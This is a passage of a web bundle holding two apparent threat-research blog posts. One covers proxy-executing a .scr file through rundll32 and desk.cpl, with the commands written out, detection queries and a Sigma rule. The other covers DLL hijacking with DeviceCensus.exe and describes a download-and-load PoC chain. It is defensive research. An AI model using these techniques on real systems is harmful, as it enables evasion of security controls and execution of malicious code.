https://www.linkedin.com/in/joseluissm/"},{"id":"InstallScreenSaver-SCR-files","metadata":{"permalink":"/jstnk9/research/InstallScreenSaver-SCR-files","source":"@site/research/2022-05-03-InstallScreenSaver-SCR-files/2022-05-03-InstallScreenSaver-SCR-files.md","title":"Executing SCR files using desk.cpl and InstallScreenSaver API Call","description":"Summary","date":"2022-05-03T00:00:00.000Z","formattedDate":"May 3, 2022","tags":[{"label":"threat hunting","permalink":"/jstnk9/research/tags/threat-hunting"},{"label":"detection","permalink":"/jstnk9/research/tags/detection"},{"label":"visibility","permalink":"/jstnk9/research/tags/visibility"},{"label":"research","permalink":"/jstnk9/research/tags/research"}],"readingTime":3.895,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Using Jlaive to create batch files from .NET assemblies for defense evasion","permalink":"/jstnk9/research/Jlaive-Antivirus-Evasion-Tool"},"nextItem":{"title":"DLL Hijacking with DeviceCensus.exe on Windows 11","permalink":"/jstnk9/research/DLL-Hijacking-with-DeviceCensus.exe-on-Windows-11"}},"content":"## Summary\\r\\n\\r\\n:::info\\r\\n\\r\\nThis blog was made from the following sources.\\r\\n\\r\\n**Reference 1:** https://vxug.fakedoma.in/zines/29a/29a7/Articles/29A-7.030.txt\\r\\n\\r\\n**Reference 2:** https://twitter.com/pabraeken/status/998627081360695297\\r\\n\\r\\n**Reference 3:** https://twitter.com/VakninHai/status/1517027824984547329\\r\\n\\r\\n**Reference 4:** https://lolbas-project.github.io/lolbas/Libraries/Desk/\\r\\n\\r\\n:::\\r\\n\\r\\nRecently some researchers have discovered a possible execution of binaries using the Windows Desktop Settings Control Panel utility located at `C:\\\\Windows\\\\System32\\\\desk.cpl` or `C:\\\\Windows\\\\SysWOW64\\\\desk.cpl` for 32-bit.\\r\\n\\r\\nThis utility allows executing a binary with a `.scr` extension by calling the `InstallScreenSaver` function.\\r\\n\\r\\nThe objective of this entry is focused only on identifying the visibility and detection of the operating system.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Testing the behavior\\r\\n\\r\\nIn this case, I\'m going to create a copy of `cmd.exe` called `joseliyopoc.scr` on the desktop.\\r\\n\\r\\n```\\r\\ncopy C:\\\\windows\\\\system32\\\\cmd.exe C:\\\\users\\\\jstnk\\\\Desktop\\\\joseliyopoc.scr\\r\\n```\\r\\n\\r\\nAfter that, I run `desk.cpl` using `rundll32.exe` on a new command line passing the `InstallScreenSaver` API call and the newly created `.scr` file as parameters.\\r\\n\\r\\n```\\r\\nrundll32.exe desk.cpl,InstallScreenSaver C:\\\\users\\\\jstnk\\\\desktop\\\\joseliyopoc.scr\\r\\n```\\r\\n\\r\\n### Sysmon\\r\\n\\r\\nWe can see in Sysmon how there are different events generated during the previous execution. However, focusing on those events that could be of more interest to generate detections are related to events number `1 - Process Create` and `13 - Registry Value Set`\\r\\n\\r\\n![flowdark](https://jstnk9.github.io/jstnk9/img/scr-research/flow_dk.png#gh-dark-mode-only)![flowwhite](https://jstnk9.github.io/jstnk9/img/scr-research/flow_wt.png#gh-light-mode-only)\\r\\n\\r\\nIn the case of the registry key related to `HKU\\\\<sid>\\\\Control Panel\\\\Desktop\\\\SCRNSAVE.EXE`, it can be seen that the value in this case is the name of the `.scr` file. This information is really useful to generate detection mechanisms based on the entire context of this execution that we are carrying out (execution of `rundll32`, call to the `InstallScreenSaver` API, etc).\\r\\n\\r\\nThe other two values of the keys `HKU\\\\<sid>\\\\Control Panel\\\\Desktop\\\\ScreenSaveActive` and `HKU\\\\<sid>\\\\Control Panel\\\\Desktop\\\\ScreenSaveTimeOut` are also interesting, since in both cases, after multiple executions of this proof of concept, the values were the same in all cases (with this run by default).\\r\\n\\r\\n![sysmon_events_m2](https://jstnk9.github.io/jstnk9/img/scr-research/sysmon_events_m.png)\\r\\n\\r\\nYou can get more information about these registry keys in the following links:\\r\\n\\r\\n* ScreenSaveTimeOut: http://systemmanager.ru/win2k_regestry.en/34634.htm\\r\\n* ScreenSaveActive: http://systemmanager.ru/win2k_regestry.en/93257.htm\\r\\n* SCRNSAVE.EXE: https://docs.microsoft.com/sk-sk/windows/win32/devnotes/scrnsave-exe\\r\\n\\r\\nSomething interesting that is important to mention is that, in seconds, thirds, fourths, etc. executions, only two of the three registry keys seen above are modified or there is any kind of interaction with them. These keys are the ones related to `ScreenSaveActive` and `SCRNSAVE.EXE`. In both cases, the value will be the same as seen above, unless the `.scr` file we run has a different name, in which case the value of `SCRNSAVE.EXE` will be that of the new `.scr` file.\\r\\n\\r\\n![sysmon_events_m2](https://jstnk9.github.io/jstnk9/img/scr-research/sysmon_events_m2.png)\\r\\n\\r\\n### Procmon\\r\\n\\r\\n:::info \\r\\n\\r\\nIn this Twitter thread you have more info about the execution I did using procmon: https://twitter.com/Joseliyo_Jstnk/status/1519769245378297856\\r\\n\\r\\n:::\\r\\n\\r\\nIn this case, I used a different name for the `.scr` file and a different OS version (both W10). The rest of the process was similar. The following image contains the information about the registry keys mentioned above, where it is reflected that new values are established.\\r\\n\\r\\n![procmon1](https://jstnk9.github.io/jstnk9/img/scr-research/procm1.png)\\r\\n\\r\\nWhen performing different executions, even changing the name of the `.scr` file, it can be seen how from the second iteration, only two registry keys are modified. However, the first time we run it, all three keys are changed. The following image shows the 4 executions that I did.\\r\\n\\r\\n![procmon2](https://jstnk9.github.io/jstnk9/img/scr-research/procm2.png)\\r\\n\\r\\n## Detection\\r\\n\\r\\nThe following Elastic Query can help us to detect the behavior described above, if our purpose is detect the changes of the 3 registry keys.\\r\\n\\r\\n```sql\\r\\n((winlog.event_data.EventType:\\"SetValue\\" AND winlog.event_data.Image:\\"*\\\\\\\\rundll32.exe\\") AND ((winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\ScreenSaveActive*\\" AND winlog.event_data.Details:\\"1\\") OR (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\ScreenSaveTimeOut*\\" AND winlog.event_data.Details:\\"900\\") OR (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\SCRNSAVE.EXE*\\" AND winlog.event_data.Details:*.scr)))\\r\\n```\\r\\n\\r\\n```((winlog.event_data.EventType:\\"SetValue\\" AND winlog.event_data.Image:\\"*\\\\\\\\rundll32.exe\\") AND ((winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\ScreenSaveActive*\\" AND winlog.event_data.Details:\\"1\\") OR (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\ScreenSaveTimeOut*\\" AND winlog.event_data.Details:\\"900\\") OR (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\SCRNSAVE.EXE*\\" AND winlog.event_data.Details:*.scr)))```\\r\\n\\r\\n![detection1](https://jstnk9.github.io/jstnk9/img/scr-research/detection_elastic.png)\\r\\n\\r\\nHowerver, if we want to detect only the key related to the .scr file when it is established using `rundll32.exe`, the following query can help us.\\r\\n\\r\\n```sql\\r\\n(winlog.event_data.EventType:\\"SetValue\\" AND winlog.event_data.Image:\\"*\\\\\\\\rundll32.exe\\") AND (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\SCRNSAVE.EXE*\\" AND winlog.event_data.Details:*.scr)\\r\\n```\\r\\n\\r\\n```(winlog.event_data.EventType:\\"SetValue\\" AND winlog.event_data.Image:\\"*\\\\\\\\rundll32.exe\\") AND (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\SCRNSAVE.EXE*\\" AND winlog.event_data.Details:*.scr)```\\r\\n\\r\\n![detection2](https://jstnk9.github.io/jstnk9/img/scr-research/detection_elastic2.png)\\r\\n\\r\\n**UPDATE May 6, 2022**\\r\\n\\r\\nNew query to avoid false positives related to legitimate use of screen saver. Preventing the SCRNSAVE.EXE registry key contains system32 and syswow64 paths.\\r\\n\\r\\n```sql\\r\\n(winlog.event_data.EventType:\\"SetValue\\" AND winlog.event_data.Image:\\"*\\\\\\\\rundll32.exe\\") AND (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\SCRNSAVE.EXE*\\" AND winlog.event_data.Details:*.scr) AND NOT (winlog.event_data.Details:\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\\" OR winlog.event_data.Details:\\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*\\")\\r\\n```\\r\\n\\r\\n```(winlog.event_data.EventType:\\"SetValue\\" AND winlog.event_data.Image:\\"*\\\\\\\\rundll32.exe\\") AND (winlog.event_data.TargetObject:\\"*\\\\\\\\Control Panel\\\\\\\\Desktop\\\\\\\\SCRNSAVE.EXE*\\" AND winlog.event_data.Details:*.scr) AND NOT (winlog.event_data.Details:\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\\" OR winlog.event_data.Details:\\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*\\")```\\r\\n\\r\\n### Sigma rule\\r\\n\\r\\nNew sigma rule published on GitHub.\\r\\n\\r\\nSigma link: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml\\r\\n\\r\\n```yaml\\r\\ntitle: ScreenSaver Registry Key Set\\r\\nid: 40b6e656-4e11-4c0c-8772-c1cc6dae34ce\\r\\ndescription: Detects registry key established after masqueraded .scr file execution using Rundll32 through desk.cpl\\r\\nstatus: experimental\\r\\ndate: 2022/05/04\\r\\nmodified: 2022/05/04\\r\\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\\r\\nreferences:\\r\\n    - https://twitter.com/VakninHai/status/1517027824984547329\\r\\n    - https://twitter.com/pabraeken/status/998627081360695297\\r\\n    - https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files\\r\\nlogsource:\\r\\n    product: windows\\r\\n    category: registry_set\\r\\ndetection:\\r\\n    selection:\\r\\n        EventType: SetValue\\r\\n        Image|endswith: \'\\\\rundll32.exe\'\\r\\n    registry:\\r\\n        TargetObject|contains: \'\\\\Control Panel\\\\Desktop\\\\SCRNSAVE.EXE\'\\r\\n        Details|endswith: \'.scr\'\\r\\n    filter:\\r\\n        Details|contains: \\r\\n        - \'C:\\\\Windows\\\\System32\\\\\'\\r\\n        - \'C:\\\\Windows\\\\SysWOW64\\\\\'\\r\\n    condition: selection and registry and not filter\\r\\nfalsepositives:\\r\\n    - legitimate use of screen saver\\r\\nlevel: medium\\r\\ntags:\\r\\n    - attack.defense_evasion\\r\\n    - attack.t1218.011\\r\\n```\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"},{"id":"DLL-Hijacking-with-DeviceCensus.exe-on-Windows-11","metadata":{"permalink":"/jstnk9/research/DLL-Hijacking-with-DeviceCensus.exe-on-Windows-11","source":"@site/research/2022-03-24-DLL-Hijacking-with-DeviceCensus.exe-on-Windows-11/2022-03-24-DLL-Hijacking-with-DeviceCensus.exe-on-Windows-11.md","title":"DLL Hijacking with DeviceCensus.exe on Windows 11","description":"Summary","date":"2022-03-24T00:00:00.000Z","formattedDate":"March 24, 2022","tags":[{"label":"threat hunting","permalink":"/jstnk9/research/tags/threat-hunting"},{"label":"detection","permalink":"/jstnk9/research/tags/detection"},{"label":"visibility","permalink":"/jstnk9/research/tags/visibility"},{"label":"windows 11","permalink":"/jstnk9/research/tags/windows-11"},{"label":"research","permalink":"/jstnk9/research/tags/research"}],"readingTime":2.9,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Executing SCR files using desk.cpl and InstallScreenSaver API Call","permalink":"/jstnk9/research/InstallScreenSaver-SCR-files"}},"content":"## Summary\\r\\n\\r\\n**Tested on Windows 11 10.0.22000 N/A Build 22000.**\\r\\n\\r\\nDuring January I was investigating Windows 11 and some of the binaries that were installed by default to identify behaviors that could be used for malicious purposes.\\r\\n\\r\\nThe binary `DeviceCensus.exe` located in `C:\\\\Windows\\\\System32`, when is copied to another different path and it is executed, it tries to load more or less 11 DLLs **in the directory where it was executed**. Let\'s say that if you try to execute this binary from `AppData` path, then it tries to load the DLLs from `AppData`. However, if the DLL doensn\'t exists in `AppData`, then it tries to load from `System32`. \\r\\n\\r\\nThen, if you copy this binary in `AppData` and create a DLL with the same name that tries to load, the DLL is loaded.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n:::info\\r\\n\\r\\nI would like to say that I reported this to MSRC and they told me that **it is not a vulnerability**. They sent me the following information explaining why it is not a vulnerability :). \\r\\n\\r\\nThanks MSRC for explaining!\\r\\n\\r\\n**Reference 1:** https://devblogs.microsoft.com/oldnewthing/20150527-00/?p=45024\\r\\n\\r\\n**Reference 2:** https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/\\r\\n\\r\\n:::\\r\\n\\r\\n## Testing the behavior\\r\\n\\r\\nFirst, I moved the binary `DeviceCensus.exe` to `AppData` path and executed it.\\r\\n\\r\\n![device-1.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/device-1.PNG)\\r\\n\\r\\nAs you can see, there are different DLLs that the binary is trying to load from the path where it was executed. However, some of them can\'t be loaded during the execution.\\r\\n\\r\\n![device-3.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/device-3.PNG)\\r\\n\\r\\nFocusing in the DLL called `umpdc.dll`, we can see how it was loaded because the first option of load doesn\'t work. It is known as [DLL Hijacking](https://attack.mitre.org/techniques/T1574/001/).\\r\\n\\r\\n![device-4.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/device-4.PNG)\\r\\n\\r\\nHowever, for this PoC, I\'ve created a DLL called `umpdc.dll` with a MessageBox. Instead of a MessageBox, it can establish a reverse shell or whatever action (drop another binary and execute it, load in memory malicious code, process injection, etc.)\\r\\n\\r\\nAlso, for this PoC, I\u2019ve created a VBS to do the following chain attack:\\r\\n1.\\tConnect to GitHub and Download a DLL\\r\\n2.\\tDrop the DLL in %appdata%\\r\\n3.\\tCopy `DeviceCensus.exe` from system32 to %appdata%\\r\\n4.\\tLoad `DeviceCensus.exe` in order to load the malicious DLL from path where is executed.\\r\\n\\r\\nThe initial access could be whatever, either [spearphising with link](https://attack.mitre.org/techniques/T1566/002/) or [spearphishing with attachment](https://attack.mitre.org/techniques/T1566/001/). The typical scenario is a office file with macros, which after the execution, connects to remote servers to download a second-stage payload. In this case, I\'ve executed directly `wscript.exe` to load the VBS file.\\r\\n\\r\\n![dark](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/full_chain_dark.png#gh-dark-mode-only)![light](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/full_chain_l.png#gh-light-mode-only)\\r\\n\\r\\nThe above image show the **Sysmon Events IDs** (EVID) for each step of the PoC. This can help you to create detections rules for similar scenarios, not focusing only in the DLL and binary. The sysmon configuration used was the one of [SwiftOPneSecurity](https://github.com/SwiftOnSecurity/sysmon-config) adding Image Load events.\\r\\n\\r\\n## PoC\\r\\n\\r\\nWhen the VBS file is executed on the target machine, we can see the following events made by `wscript.exe`. After the execution, the first thing to do is connects to GitHub and download the DLL into the local system.\\r\\n\\r\\n![device-6.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/device-6.PNG)\\r\\n\\r\\nThen, the DLL is created in the `AppData` path, because we configured it in the VBS script. Also, the file `DeviceCensus.exe` is copied from `C:\\\\Windows\\\\System32` to `AppData`.\\r\\n\\r\\n![device-7.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/device-7.PNG)\\r\\n\\r\\nThe last task that the VBS does, is run `DeviceCensus.exe`, which after the execution it can load the `UMPDC.dll`.\\r\\n\\r\\n![device-8.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/device-8.PNG)\\r\\n\\r\\nThe message will appear on the screen when the DLL is loaded.\\r\\n\\r\\n![device-9.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/device-9.PNG)\\r\\n\\r\\nThe full activity on Sysmon looks like this.\\r\\n\\r\\n![sysmon-1.png](https://jstnk9.github.io/jstnk9/img/analysis-devicecensus/sysmon1.png)\\r\\n\\r\\n### VBS Script\\r\\n\\r\\nDownload from gist: https://gist.github.com/jstnk9/c0f8861cf1247741812f9f0210b591ee\\r\\n\\r\\n### DLL \\r\\n\\r\\nDownload from git: https://github.com/jstnk9/Research/blob/main/UMPDC.dll\\r\\n\\r\\nDLL code from gist: https://gist.github.com/jstnk9/034d6add18a2692e451b254472a823f9\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"}]}')}}]);